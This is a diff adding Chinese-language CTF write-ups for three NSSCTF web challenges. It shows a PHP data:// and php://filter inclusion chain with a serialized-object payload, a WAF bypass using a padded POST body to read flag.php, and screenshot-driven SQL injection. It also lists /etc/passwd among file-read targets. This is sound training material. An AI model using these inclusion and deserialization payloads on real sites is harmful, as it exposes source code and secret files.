@@ -1113,4 +1113,281 @@ dirsearch -u http://node7.anna.nssctf.cn:29107/?m=login
 
 ![1761120014020](images/NSS/1761120014020.png)
 
-# 35.
+# 35.[ZJCTF 2019]NiZhuanSiWei
+
+打开环境看到题目
+
+![1761547768222](images/NSS/1761547768222.png)
+
+第一层过滤要求
+
+`if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))`
+
+isset()函数是确保参数存在,也就是确保参数非空
+
+在这就是确保isset($text)中的参数
+
+$text不为空
+
+其次要求`file_get_contents($text)`的返回值**严格等于**字符串`"welcome to the zjctf"`
+
+直接使用 `welcome to the zjctf` 作为 `$text` 的值
+
+如果我们将 `$text` 设为 `welcome to the zjctf`（即 URL 参数为 `?text=welcome to the zjctf`），此时 `file_get_contents($text)` 会把 `$text` 的值当作**文件路径**，尝试读取服务器上名为 `welcome to the zjctf` 的文件。
+
+但实际上，服务器上几乎不可能存在这个名字的文件（文件名包含空格且内容刚好是自身），因此 `file_get_contents` 会返回 `false` 或报错，无法满足 `file_get_contents($text) === "welcome to the zjctf"` 的条件，导致无法进入后续逻辑。
+
+使用 `data://text/plain,welcome to the zjctf` 作为 `$text` 的值
+
+`data://` 是 PHP 支持的一种**伪协议**，用于直接传递数据（而非读取实际文件）。其格式为 `data://[MIME类型],[数据内容]`。
+
+在这里，`data://text/plain,welcome to the zjctf` 的含义是：
+
+* `text/plain` 表示数据的 MIME 类型为纯文本；
+* 逗号后面的 `welcome to the zjctf` 是实际要传递的数据。
+
+当 `file_get_contents` 处理这个伪协议时，会直接读取逗号后面的字符串，而不是去访问服务器上的文件。因此 `file_get_contents($text)` 的返回值就是 `welcome to the zjctf`，刚好满足代码中的判断条件 `file_get_contents($text) === "welcome to the zjctf"`，从而通过第一层验证。
+
+第二次过滤要求
+
+`if(preg_match("/flag/",$file)){ echo "Not now!"; exit(); }`
+
+preg_match()函数,PHP 的正则匹配函数，成功返回 **1**，失败返回 **0**，错误返回 **false**。
+
+* 正则模式`/flag/`：
+  * 前后的`/`是正则表达式的定界符，中间的`flag`是匹配的核心内容（纯文本）。
+  * 含义：匹配**任何包含 “flag” 子字符串**的内容（不限制位置，比如 “flag.php”“aflag”“flag123” 都会被匹配）。
+  * 注意：这里没有加`i`修饰符（如`/flag/i`），所以只严格匹配小写的 “flag”（大写 “FLAG” 不会被匹配，但实际场景中 flag 相关文件通常用小写命名）。
+
+`include($file); //useless.php`
+
+* `include($file)`：PHP 的`include`函数会将`$file`对应的文件内容当作 PHP 代码加载并执行。例如，如果`$file`是`useless.php`，就会加载该文件中的所有代码（类定义、函数等）。
+* 注释`//useless.php`是关键提示：题目暗示`useless.php`是合法且需要被包含的文件（因为它不包含`flag`关键词，能通过前面的`preg_match`过滤）。
+* 为什么需要包含这个文件？
+  因为后续的`unserialize($password)`需要依赖类的定义（PHP 反序列化时，必须先加载被反序列化对象所属的类，否则会报错 “Class not found”）。因此`useless.php`中一定定义了某个关键类。
+
+前面我们通过`data://`伪协议满足了`$text`的验证，但`$file`参数需要包含`useless.php`（代码注释提示）。不过，我们并不知道`useless.php`里写了什么 —— 而后续的反序列化操作必须依赖这个文件中定义的类（比如类名、属性名、魔术方法等）。
+
+如果直接用`file=useless.php`，`include`会执行该文件的 PHP 代码（不会显示源码），所以必须用 \*\*`php://filter`伪协议 \*\* 读取它的源码（以编码形式输出，避免被 PHP 解析）。
+
+`php://filter` 伪协议之所以能读取 PHP 文件的源码，核心在于它能**在文件内容被 PHP 解析执行前，对其进行 “过滤处理”**，将源码以 “非执行” 的形式输出。
+
+`php://filter/read=过滤器/resource=目标文件`
+
+
+用这个playload看到
+
+`file=php://filter/read=convert.base64-encode/resource=useless.php`
+
+```
+welcome to the zjctf
+
+PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
+```
+
+解码后看到
+
+![1761551378398](images/NSS/1761551378398.png)
+
+这段代码是`useless.php`的核心内容，定义了一个名为`Flag`的类，它是我们实现反序列化攻击、读取`flag.php`的关键。我们逐行拆解其作用和在解题中的意义：
+
+### 1. 类定义：`class Flag{ ... }`
+
+定义了一个名为`Flag`的类（类名是后续反序列化的关键标识，必须准确匹配）。
+
+### 2. 属性：`public $file;`
+
+* 声明了一个**公共属性**`$file`（`public`意味着可以被外部直接访问和赋值）。
+* 这个属性的作用是**存储要读取的文件名**（比如我们需要它指向`flag.php`）。
+
+### 3. 魔术方法：`public function __tostring(){ ... }`
+
+这是 PHP 中非常重要的**魔术方法**，作用是：当对象被当作字符串处理时（比如用`echo`输出对象），会自动调用该方法。
+
+方法内部逻辑：
+
+php
+
+```php
+if(isset($this->file)){  // 检查$file属性是否被设置（非空）
+    echo file_get_contents($this->file);  // 读取$file对应的文件内容并输出
+    echo "<br>";  // 输出换行
+    return ("U R SO CLOSE !///COME ON PLZ");  // 返回一个字符串
+}
+```
+
+* 核心功能：如果`$file`属性有值（比如设为`flag.php`），则通过`file_get_contents`读取该文件的内容并输出 —— 这正是我们获取 flag 的关键操作！
+* 触发条件：当反序列化得到`Flag`对象后，代码执行`echo $password`（此时`$password`是`Flag`对象），会自动调用`__toString`方法。
+
+先构造flag类的对象名且序列化
+
+```php
+<?php
+// 必须先定义和useless.php中一致的Flag类（否则序列化会出错）
+class Flag{
+    public $file; // 和源码中的属性名一致
+}
+
+// 1. 实例化Flag对象
+$obj = new Flag();
+
+// 2. 设置$file属性为"flag.php"（要读取的目标文件）
+$obj->file = "flag.php";
+
+// 3. 序列化对象，得到可用于password参数的字符串
+echo serialize($obj);
+?>
+```
+
+然后用这个playload
+
+```abc
+?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+```
+
+然后查看源码,发现flag
+
+![1761551651162](images/NSS/1761551651162.png)
+
+# 36.[鹏城杯 2022]简单包含
+
+尝试查看flag.php
+
+![1761556428268](images/NSS/1761556428268.png)
+
+发现被墙了
+
+用php://filter伪协议尝试
+
+`php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php`
+
+![1761557041738](images/NSS/1761557041738.png)
+
+还是不行
+
+尝试访问index.php看看具体的过滤规则
+
+![1761557664589](images/NSS/1761557664589.png)
+
+base64解码后得到
+
+```php
+<?php
+
+$path = $_POST["flag"];
+
+if (strlen(file_get_contents('php://input')) < 800 && preg_match('/flag/', $path)) {
+    echo 'nssctf waf!';
+} else {
+    @include($path);
+}
+?>
+
+<code><span style="color: #000000">
+<span style="color: #0000BB"><?php <br />highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />include(</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">[</span><span style="color: #DD0000">"flag"</span><span style="color: #007700">]);<br /></span><span style="color: #FF8000">//flag in /var/www/html/flag.php;</span>
+</span>
+</code><br />
+
+```
+
+思路 1：让 POST 请求体长度 ≥ 800（最直接）
+
+思路 2：让`$path`不包含 "flag"（适用于长度受限场景）
+
+```php
+a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+&flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php
+```
+
+用第一种,得到flag
+
+PD9waHAgPSdOU1NDVEZ7YzQwNGJiMzYtMDEwNS00YTdhLTlhMGMtODQ4YjIxOWRiNDM1fSc7Cg==
+
+![1761558309346](images/NSS/1761558309346.png)
+
+![1761558355104](images/NSS/1761558355104.png)
+
+## 🏗️ 典型网站目录结构
+
+**text**
+
+```
+/var/www/html/              # Web根目录
+├── index.php              # 主入口文件
+├── flag.php              # 包含flag的文件
+├── your_current_file.php  # 你正在访问的文件
+└── 其他网页文件、CSS、JS等
+```
+
+## 📁 关键目录说明
+
+### **Web相关目录**：
+
+* `/var/www/html/` - **Web根目录**，Apache/Nginx默认从这里提供网页服务
+* `/var/www/` - 通常包含所有网站项目
+* `/etc/apache2/` 或 `/etc/nginx/` - Web服务器配置文件
+* `/var/log/apache2/` 或 `/var/log/nginx/` - Web服务器日志
+
+### **系统重要目录**：
+
+* `/etc/passwd` - 用户账户信息（常用于测试文件读取）
+* `/etc/hosts` - 主机名解析
+* `/proc/` - 进程信息（可能包含有趣的内容）
+* `/tmp/` - 临时文件目录
+* `/home/` - 用户主目录
+
+# 37.[SWPUCTF 2021 新生赛]sql
+
+![1761558640073](images/NSS/1761558640073.png)
+
+进入是这样的
+
+查看源码发现参数是wllm
+
+![1761558681219](images/NSS/1761558681219.png)
+
+![1761559786937](images/NSS/1761559786937.png)
+
+发现是字符型注入
+
+![1761559868746](images/NSS/1761559868746.png)
+
+报错了,被拦截了
+
+![1761559970147](images/NSS/1761559970147.png)
+
+还是报错
+
+![1761561365016](images/NSS/1761561365016.png)
+
+发现有3列
+
+![1761561671900](images/NSS/1761561671900.png)
+
+发现数据回显位是第二列和第三列
+
+![1761561814567](images/NSS/1761561814567.png)
+
+查到库名
+
+![1761561875757](images/NSS/1761561875757.png)
+
+查到表名
+
+![1761561996311](images/NSS/1761561996311.png)
+
+查到列名
+
+![1761562064730](images/NSS/1761562064730.png)
+
+查到一部分flag
+
+![1761562728017](images/NSS/1761562728017.png)
+
+又拿到一部分flag
+
+![1761562827477](images/NSS/1761562827477.png)
+
+得到最后一部分
+
+完成NSSCTF{cae0af52-b007-4ee7-afe5-eb9116ad9732}
